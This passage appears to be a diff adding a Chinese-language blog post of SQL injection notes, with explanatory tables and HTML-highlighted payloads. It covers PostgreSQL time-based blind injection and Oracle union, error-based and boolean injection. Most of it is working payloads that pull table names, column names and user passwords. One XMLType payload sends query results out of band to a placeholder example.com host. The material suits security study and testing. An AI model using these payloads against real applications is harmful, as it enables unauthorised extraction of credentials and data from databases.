class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema<span class="operator">=</span><span class="string">&#x27;public&#x27;</span> LIMIT <span class="number">1</span>), <span class="number">1</span>, <span class="number">1</span>)) <span class="operator">=</span> <span class="number">97</span> <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 使用 LEFT 函数</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND LEFT((SELECT table_name FROM information_schema.tables WHERE table_schema=&#x27;</span>public<span class="string">&#x27; LIMIT 1), 1) = &#x27;</span>a<span class="string">&#x27; --</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>Postgresql的延时函数:<strong>pg_sleep(seconds)</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 延时5秒</span></span><br><span class="line"><span class="keyword">SELECT</span> pg_sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 条件判断延时</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT CASE WHEN (SELECT current_user=&#x27;</span>postgres<span class="string">&#x27;) THEN pg_sleep(5) ELSE NULL END) --</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>获取表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 判断表数量</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT CASE WHEN (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=&#x27;</span>public<span class="string">&#x27;) &gt; 0 THEN pg_sleep(5) ELSE NULL END) --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 判断第一个表名长度</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="keyword">SELECT</span> LENGTH(table_name) <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema<span class="operator">=</span><span class="string">&#x27;public&#x27;</span> LIMIT <span class="number">1</span> <span class="keyword">OFFSET</span> <span class="number">0</span>) <span class="operator">&gt;</span> <span class="number">3</span> <span class="keyword">THEN</span> pg_sleep(<span class="number">5</span>) <span class="keyword">ELSE</span> <span class="keyword">NULL</span> <span class="keyword">END</span>) <span class="comment">--</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT CASE WHEN (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=&#x27;</span>public<span class="string">&#x27; LIMIT 1 OFFSET 0) = 5 THEN pg_sleep(5) ELSE NULL END) -- &#x27;</span>users<span class="string">&#x27;长度为5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 猜解第一个表名第一个字符 &#x27;</span>u<span class="string">&#x27;</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> ASCII(<span class="built_in">SUBSTRING</span>((<span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema<span class="operator">=</span><span class="string">&#x27;public&#x27;</span> LIMIT <span class="number">1</span> <span class="keyword">OFFSET</span> <span class="number">0</span>), <span class="number">1</span>, <span class="number">1</span>)) <span class="operator">&gt;</span> <span class="number">100</span> <span class="keyword">THEN</span> pg_sleep(<span class="number">5</span>) <span class="keyword">ELSE</span> <span class="keyword">NULL</span> <span class="keyword">END</span>) <span class="comment">--</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT CASE WHEN ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=&#x27;</span>public<span class="string">&#x27; LIMIT 1 OFFSET 0), 1, 1)) = 117 THEN pg_sleep(5) ELSE NULL END) -- &#x27;</span>u<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>获取列名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 判断列数量</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT CASE WHEN (SELECT COUNT(*) FROM information_schema.columns WHERE table_name=&#x27;</span>users<span class="string">&#x27;) = 3 THEN pg_sleep(5) ELSE NULL END) --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 判断第一列名长度</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="keyword">SELECT</span> LENGTH(column_name) <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> ordinal_position LIMIT <span class="number">1</span> <span class="keyword">OFFSET</span> <span class="number">0</span>) <span class="operator">=</span> <span class="number">2</span> <span class="keyword">THEN</span> pg_sleep(<span class="number">5</span>) <span class="keyword">ELSE</span> <span class="keyword">NULL</span> <span class="keyword">END</span>) <span class="comment">-- &#x27;id&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 猜解第一列名 &#x27;i&#x27;, &#x27;d&#x27;</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT CASE WHEN ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name=&#x27;</span>users<span class="string">&#x27; ORDER BY ordinal_position LIMIT 1 OFFSET 0), 1, 1)) = 105 THEN pg_sleep(5) ELSE NULL END) -- &#x27;</span>i<span class="string">&#x27;</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> ASCII(<span class="built_in">SUBSTRING</span>((<span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> ordinal_position LIMIT <span class="number">1</span> <span class="keyword">OFFSET</span> <span class="number">0</span>), <span class="number">2</span>, <span class="number">1</span>)) <span class="operator">=</span> <span class="number">100</span> <span class="keyword">THEN</span> pg_sleep(<span class="number">5</span>) <span class="keyword">ELSE</span> <span class="keyword">NULL</span> <span class="keyword">END</span>) <span class="comment">-- &#x27;d&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>获取数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 判断 flag 密码长度</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT CASE WHEN (SELECT LENGTH(password) FROM users WHERE username=&#x27;</span>flag<span class="string">&#x27;) &gt; 10 THEN pg_sleep(5) ELSE NULL END) --</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="keyword">SELECT</span> LENGTH(password) <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>) <span class="operator">&gt;</span> <span class="number">15</span> <span class="keyword">THEN</span> pg_sleep(<span class="number">5</span>) <span class="keyword">ELSE</span> <span class="keyword">NULL</span> <span class="keyword">END</span>) <span class="comment">--</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT CASE WHEN (SELECT LENGTH(password) FROM users WHERE username=&#x27;</span>flag<span class="string">&#x27;) = 16 THEN pg_sleep(5) ELSE NULL END) --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 逐字符猜解 flag 密码</span></span><br><span class="line"><span class="string">-- 第1个字符 &#x27;</span>f<span class="string">&#x27; (ASCII 102)</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> ASCII(<span class="built_in">SUBSTRING</span>((<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>), <span class="number">1</span>, <span class="number">1</span>)) <span class="operator">&gt;</span> <span class="number">100</span> <span class="keyword">THEN</span> pg_sleep(<span class="number">5</span>) <span class="keyword">ELSE</span> <span class="keyword">NULL</span> <span class="keyword">END</span>) <span class="comment">--</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT CASE WHEN ASCII(SUBSTRING((SELECT password FROM users WHERE username=&#x27;</span>flag<span class="string">&#x27;), 1, 1)) = 102 THEN pg_sleep(5) ELSE NULL END) --</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Oracle-Database"><a href="#Oracle-Database" class="headerlink" title="Oracle Database"></a>Oracle Database</h1><h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><p>Oracle数据库是甲骨文公司（Oracle Corporation）开发的一款关系型数据库管理系统（RDBMS）。它基于SQL语言进行数据操作，不仅是全球最广泛使用的数据库系统之一，更是数据库技术发展史上的一个里程碑</p>
+<h2 id="数据库信息表"><a href="#数据库信息表" class="headerlink" title="数据库信息表"></a>数据库信息表</h2><table>
+<thead>
+<tr>
+<th align="left">视图名</th>
+<th align="left">作用</th>
+<th align="left">关键字段</th>
+<th align="left">典型查询</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>V$VERSION</strong></td>
+<td align="left">数据库版本信息</td>
+<td align="left"><code>BANNER</code></td>
+<td align="left"><code>SELECT BANNER FROM V$VERSION WHERE ROWNUM=1</code></td>
+</tr>
+<tr>
+<td align="left"><strong>V$INSTANCE</strong></td>
+<td align="left">实例运行信息</td>
+<td align="left"><code>INSTANCE_NAME</code>, <code>HOST_NAME</code>, <code>VERSION</code></td>
+<td align="left"><code>SELECT INSTANCE_NAME FROM V$INSTANCE</code></td>
+</tr>
+<tr>
+<td align="left"><strong>V$DATABASE</strong></td>
+<td align="left">数据库信息</td>
+<td align="left"><code>NAME</code>, <code>CREATED</code></td>
+<td align="left"><code>SELECT NAME FROM V$DATABASE</code></td>
+</tr>
+</tbody></table>
+<h2 id="注入关键表"><a href="#注入关键表" class="headerlink" title="注入关键表"></a>注入关键表</h2><table>
+<thead>
+<tr>
+<th align="left">表名</th>
+<th align="left">作用</th>
+<th align="left">关键字段</th>
+<th align="left">典型查询</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>USER_TABLES</strong></td>
+<td align="left">当前用户的所有表</td>
+<td align="left"><code>TABLE_NAME</code>, <code>NUM_ROWS</code></td>
+<td align="left"><code>SELECT TABLE_NAME FROM USER_TABLES WHERE ROWNUM=1</code></td>
+</tr>
+<tr>
+<td align="left"><strong>USER_TAB_COLUMNS</strong></td>
+<td align="left">当前用户的列信息</td>
+<td align="left"><code>TABLE_NAME</code>, <code>COLUMN_NAME</code>, <code>DATA_TYPE</code></td>
+<td align="left"><code>SELECT COLUMN_NAME FROM USER_TAB_COLUMNS WHERE TABLE_NAME=&#39;USERS&#39;</code></td>
+</tr>
+<tr>
+<td align="left"><strong>USER_USERS</strong></td>
+<td align="left">当前用户信息</td>
+<td align="left"><code>USERNAME</code>, <code>ACCOUNT_STATUS</code></td>
+<td align="left"><code>SELECT USERNAME FROM USER_USERS</code></td>
+</tr>
+<tr>
+<td align="left"><strong>DUAL</strong></td>
+<td align="left">虚拟表（语法占位）</td>
+<td align="left"><code>DUMMY</code>（单行单列）</td>
+<td align="left"><code>SELECT USER FROM DUAL</code></td>
+</tr>
+</tbody></table>
+<h2 id="联合注入-1"><a href="#联合注入-1" class="headerlink" title="联合注入"></a>联合注入</h2><p><strong>判断列数：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-- 闭合单引号，然后 ORDER BY，最后注释掉后面的单引号</span><br><span class="line">username=admin&#x27; ORDER BY 4 -- </span><br><span class="line">username=admin&#x27; ORDER BY 5 -- </span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>Oracle 规定</strong>：任何 <code>SELECT</code> 语句都必须带有 <code>FROM</code> 子句</p>
+<p>也就是说，在 Oracle 中：</p>
+<ul>
+<li><code>SELECT 1, &#39;abc&#39;</code> → <strong>语法错误</strong></li>
+<li><code>SELECT 1, &#39;abc&#39; FROM DUAL</code> → <strong>正确</strong></li>
+</ul>
+<p><strong>什么dual？</strong></p>
+<p><code>DUAL</code> 是 Oracle 中一个<strong>特殊的虚拟表</strong>，它：</p>
+<ul>
+<li>属于系统用户 <code>SYS</code></li>
+<li>只有<strong>一列</strong>（<code>DUMMY</code>，类型为 <code>VARCHAR2(1)</code>）</li>
+<li>只有<strong>一行</strong>（值为 <code>&#39;X&#39;</code>）</li>
+<li>专门用来满足”SELECT 必须带 FROM”的语法要求</li>
+</ul>
+<p>当我们需要查询与任何实际表无关的表达式时，就使用 <code>DUAL</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-- 查询当前时间</span><br><span class="line">SELECT SYSDATE FROM DUAL;</span><br><span class="line"></span><br><span class="line">-- 计算 1+1</span><br><span class="line">SELECT 1+1 FROM DUAL;</span><br><span class="line"></span><br><span class="line">-- 联合查询中的常量值</span><br><span class="line">SELECT NULL, &#x27;abc&#x27;, 123 FROM DUAL;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>获取表名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">在回显位置插入查询语句：</span><br><span class="line">username=-admin&#x27; UNION SELECT NULL, table_name, NULL, NULL FROM USER_TABLES -- </span><br><span class="line"></span><br><span class="line">USER_TABLES：当前用户的所有表</span><br><span class="line"></span><br><span class="line">table_name：表名字段（字符型）</span><br><span class="line"></span><br><span class="line">结果中会包含 USERS 表</span><br><span class="line"></span><br><span class="line">注意：Oracle 表名默认大写，如果建表时是小写，需用双引号，但通常用大写查询。</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>获取列名：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">username=-admin&#x27; UNION SELECT NULL, column_name, NULL, NULL FROM USER_TAB_COLUMNS WHERE table_name=&#x27;USERS&#x27; -- </span><br><span class="line"></span><br><span class="line">USER_TAB_COLUMNS：存储列信息的系统表</span><br><span class="line"></span><br><span class="line">WHERE table_name=&#x27;USERS&#x27;：筛选 USERS 表的列</span><br><span class="line"></span><br><span class="line">column_name：列名字段</span><br></pre></td></tr></table></figure>
+
+
+
+<p>如果不确定表名大小写：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- 使用 UPPER() 函数</span><br><span class="line">username=-admin&#x27; UNION SELECT NULL, column_name, NULL, NULL FROM USER_TAB_COLUMNS WHERE UPPER(table_name)=UPPER(&#x27;users&#x27;) -- </span><br></pre></td></tr></table></figure>
+
+
+
+<p>查询数据:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- 查询所有用户的账号密码</span><br><span class="line">username=-admin&#x27; UNION SELECT id, username, password, email FROM USERS -- </span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="报错注入-2"><a href="#报错注入-2" class="headerlink" title="报错注入"></a>报错注入</h2><p><strong>原理:</strong></p>
+<p>报错注入的原理是<strong>故意构造一个会导致数据库报错的 SQL 语句，并将想要查询的数据“塞进”错误消息中返回</strong>。</p>
+<p>Oracle 的报错注入与 MySQL 有很大不同，MySQL 常用 <code>updatexml()</code>、<code>extractvalue()</code>，而 Oracle 则是利用<strong>内置函数在特定参数下会抛出包含数据的错误</strong>。</p>
+<p><strong>Oracle 中最常用的报错注入函数&#x2F;技巧：</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">方法</th>
+<th align="left">核心函数&#x2F;技巧</th>
+<th align="left">适用场景</th>
+<th align="left">备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>CTXSYS.DRITHSX.SN()</strong></td>
+<td align="left"><code>CTXSYS.DRITHSX.SN()</code></td>
+<td align="left">绝大多数 Oracle 版本</td>
+<td align="left"><strong>最常用</strong></td>
+</tr>
+<tr>
+<td align="left"><strong>XMLType 相关</strong></td>
+<td align="left"><code>XMLType()</code>、<code>extractvalue()</code></td>
+<td align="left">支持 XML 的版本</td>
+<td align="left">类似 MySQL</td>
+</tr>
+<tr>
+<td align="left"><strong>数值溢出</strong></td>
+<td align="left"><code>1/TO_NUMBER()</code></td>
+<td align="left">所有版本</td>
+<td align="left">利用除零错误</td>
+</tr>
+<tr>
+<td align="left"><strong>UTL_INADDR</strong></td>
+<td align="left"><code>UTL_INADDR.GET_HOST_ADDRESS()</code></td>
+<td align="left">有网络函数权限</td>
+<td align="left">可带出数据</td>
+</tr>
+<tr>
+<td align="left"><strong>DBMS_XDB_VERSION</strong></td>
+<td align="left"><code>DBMS_XDB_VERSION.CHECKOUT()</code></td>
+<td align="left">XDB 组件存在时</td>
+<td align="left">报错注入</td>
+</tr>
+</tbody></table>
+<h3 id="CTXSYS-DRITHSX-SN-报错注入"><a href="#CTXSYS-DRITHSX-SN-报错注入" class="headerlink" title="CTXSYS.DRITHSX.SN()报错注入"></a>CTXSYS.DRITHSX.SN()报错注入</h3><p><strong>CTXSYS.DRITHSX.SN()报错注入是Oracle数据库报错注入中最经典的利用</strong></p>
+<p><strong>CTXSYS.DRITHSX.SN()函数介绍：</strong></p>
+<p><code>CTXSYS.DRITHSX.SN()</code> 是 Oracle 数据库中一个<strong>被用于报错注入的核心函数</strong>，但它本身并不是为注入而设计的——它是一个 Oracle Text 组件中的内部函数，主要用于文本索引的相关操作</p>
+<p><strong>核心原理：</strong></p>
+<p>该函数被用于报错注入的本质原因是：<strong>普通用户没有创建和查询 Oracle Text 相关主题的权限</strong>，当调用此函数时，会因为查询失败而抛出错误，而错误信息中会包含我们构造的子查询结果</p>
+<p><strong>流程：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 调用 CTXSYS.DRITHSX.SN(参数1, 参数2)</span><br><span class="line">2. 参数2 中嵌入我们想要查询的 SQL 语句</span><br><span class="line">3. 函数尝试执行文本索引相关操作</span><br><span class="line">4. 由于当前用户没有相应权限，函数执行失败</span><br><span class="line">5. Oracle 抛出错误，错误信息中包含了参数2中查询的结果</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>基本语法：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CTXSYS.DRITHSX.SN(参数1, (子查询语句))</span><br><span class="line"></span><br><span class="line">注入构造:</span><br><span class="line">AND 1 = CTXSYS.DRITHSX.SN(1, (SELECT 某字段 FROM 某表 WHERE ROWNUM = 1))</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>查询当前用户</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> <span class="number">1</span> <span class="operator">=</span> CTXSYS.DRITHSX.SN(<span class="number">1</span>, (<span class="keyword">SELECT</span> <span class="keyword">USER</span> <span class="keyword">FROM</span> DUAL))</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>查询数据库版本</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> <span class="number">1</span> <span class="operator">=</span> CTXSYS.DRITHSX.SN(<span class="number">1</span>, (<span class="keyword">SELECT</span> BANNER <span class="keyword">FROM</span> V$VERSION <span class="keyword">WHERE</span> ROWNUM <span class="operator">=</span> <span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>查询第一张表名</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> <span class="number">1</span> <span class="operator">=</span> CTXSYS.DRITHSX.SN(<span class="number">1</span>, (<span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> USER_TABLES <span class="keyword">WHERE</span> ROWNUM <span class="operator">=</span> <span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>ROWNUM</strong> 是 Oracle 的一个<strong>伪列</strong>（Pseudocolumn），它表示结果集中<strong>行的序号</strong>，从 1 开始递增</p>
+<p>因为子查询只能返回一列，如果 子查询 返回多行数据，Oracle数据库会直接报错，<strong>但是函数 <code>CTXSYS.DRITHSX.SN()</code> 的第二个参数期望接收一个标量值（单个值），不能是多行结果集。</strong></p>
+<p>所以必须用 <code>ROWNUM = 1</code> 限制子查询只返回一行</p>
+<p><strong>查询指定表的列名</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> <span class="number">1</span> <span class="operator">=</span> CTXSYS.DRITHSX.SN(<span class="number">1</span>, (<span class="keyword">SELECT</span> COLUMN_NAME <span class="keyword">FROM</span> USER_TAB_COLUMNS <span class="keyword">WHERE</span> TABLE_NAME <span class="operator">=</span> <span class="string">&#x27;USERS&#x27;</span> <span class="keyword">AND</span> ROWNUM <span class="operator">=</span> <span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>查询数据（配合 rownum 和 &lt;&gt; 获取多条）</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 获取第一条</span></span><br><span class="line"><span class="keyword">AND</span> <span class="number">1</span> <span class="operator">=</span> CTXSYS.DRITHSX.SN(<span class="number">1</span>, (<span class="keyword">SELECT</span> USERNAME <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ROWNUM <span class="operator">=</span> <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取第二条（排除第一条）</span></span><br><span class="line"><span class="keyword">AND</span> <span class="number">1</span> <span class="operator">=</span> CTXSYS.DRITHSX.SN(<span class="number">1</span>, (<span class="keyword">SELECT</span> USERNAME <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ROWNUM <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> USERNAME <span class="operator">&lt;&gt;</span> <span class="string">&#x27;admin&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="XMLType-报错注入"><a href="#XMLType-报错注入" class="headerlink" title="XMLType 报错注入"></a>XMLType 报错注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 利用 XMLType 函数</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> extractvalue(xmltype(<span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http://&#x27;</span><span class="operator">||</span>(<span class="keyword">SELECT</span> <span class="keyword">user</span> <span class="keyword">FROM</span> DUAL)<span class="operator">||</span><span class="string">&#x27;.example.com/&quot;&gt;%remote;]&gt;&#x27;</span>),<span class="string">&#x27;/l&#x27;</span>) <span class="keyword">FROM</span> DUAL) <span class="keyword">IS</span> <span class="keyword">NOT NULL</span></span><br></pre></td></tr></table></figure>
+
+<p>但这种通常用于<strong>带外注入</strong>（OOB），单纯报错不如 <code>CTXSYS</code> 直接。</p>
+<h3 id="除零错误注入"><a href="#除零错误注入" class="headerlink" title="除零错误注入"></a>除零错误注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 利用 TO_NUMBER 转换错误</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span>TO_NUMBER((<span class="keyword">SELECT</span> username <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ROWNUM<span class="operator">=</span><span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+
+<p>但这种方法<strong>不会显示具体数据</strong>，只能用于布尔盲注，不适合直接报错出数据。</p>
+<h3 id="UTL-INADDR-报错注入"><a href="#UTL-INADDR-报错注入" class="headerlink" title="UTL_INADDR 报错注入"></a>UTL_INADDR 报错注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 需要数据库有网络函数权限</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> UTL_INADDR.GET_HOST_ADDRESS((<span class="keyword">SELECT</span> username <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> ROWNUM<span class="operator">=</span><span class="number">1</span>)) <span class="keyword">IS</span> <span class="keyword">NOT NULL</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>报错信息</strong>会尝试解析域名为 IP，如果域名非法会报错并显示查询结果。</p>
+<h2 id="布尔盲注-2"><a href="#布尔盲注-2" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p><strong>可利用函数：</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">用途</th>
+<th align="left">示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>ASCII()</code></td>
+<td align="left">获取字符的 ASCII 码</td>
+<td align="left"><code>ASCII(&#39;A&#39;) = 65</code></td>
+</tr>
+<tr>
+<td align="left"><code>SUBSTR()</code></td>
+<td align="left">截取字符串</td>
+<td align="left"><code>SUBSTR(&#39;abc&#39;, 1, 1) = &#39;a&#39;</code></td>
+</tr>
+<tr>
+<td align="left"><code>LENGTH()</code></td>
+<td align="left">获取字符串长度</td>
+<td align="left"><code>LENGTH(&#39;abc&#39;) = 3</code></td>
+</tr>
+<tr>
+<td align="left"><code>INSTR()</code></td>
+<td align="left">查找子串位置</td>
+<td align="left"><code>INSTR(&#39;abc&#39;, &#39;b&#39;) = 2</code></td>
+</tr>
+</tbody></table>
+<p><strong>利用：</strong></p>
+<p><strong>确认注入点（布尔测试）</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27; --      → 页面正常</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;2&#x27;</span> <span class="comment">--      → 页面异常</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>判断当前数据库用户</strong></p>
